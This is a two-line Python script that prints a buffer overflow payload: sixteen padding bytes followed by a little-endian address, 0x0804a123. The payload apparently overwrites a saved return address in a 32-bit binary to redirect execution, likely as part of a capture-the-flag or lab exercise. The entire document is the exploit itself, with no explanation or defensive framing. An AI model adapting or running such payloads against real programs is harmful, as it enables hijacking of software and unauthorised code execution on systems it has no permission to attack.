import sys
sys.stdout.buffer.write(b"\x60"*16 + 0x804a123.to_bytes(4,"little"))
